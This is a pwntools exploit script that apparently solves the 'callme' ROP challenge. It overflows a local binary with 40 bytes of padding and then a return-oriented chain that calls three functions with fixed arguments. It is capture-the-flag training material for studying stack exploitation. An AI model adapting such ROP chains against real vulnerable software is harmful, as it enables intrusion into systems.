#!/usr/bin/python3
from pwn import *

# Note: The exploit needs to be executed in the same directory as callme binary
elf = context.binary = ELF('./callme', checksec=False)

first_param = 0xdeadbeefdeadbeef.to_bytes(8, 'little')
second_param = 0xcafebabecafebabe.to_bytes(8, 'little')
third_param = 0xd00df00dd00df00d.to_bytes(8, 'little')

callme_one_address = p64(elf.symbols.plt.callme_one)
callme_two_address = p64(elf.symbols.plt.callme_two)
callme_three_address = p64(elf.symbols.plt.callme_three)

useful_function_address = p64(elf.symbols.usefulFunction)
rop = ROP('./callme')
gadget_address = p64(rop.rdi_rsi_rdx.address)

addresses = gadget_address + first_param + second_param + third_param + callme_one_address + \
            gadget_address + first_param + second_param + third_param + callme_two_address + \
            gadget_address + first_param + second_param + third_param + callme_three_address

payload = b'a' * 40 + addresses
# p = gdb.debug('./callme', 'b main')
p = process('./callme')
p.recvuntil(b'>')
p.sendline(payload)
print(p.recvall().decode())
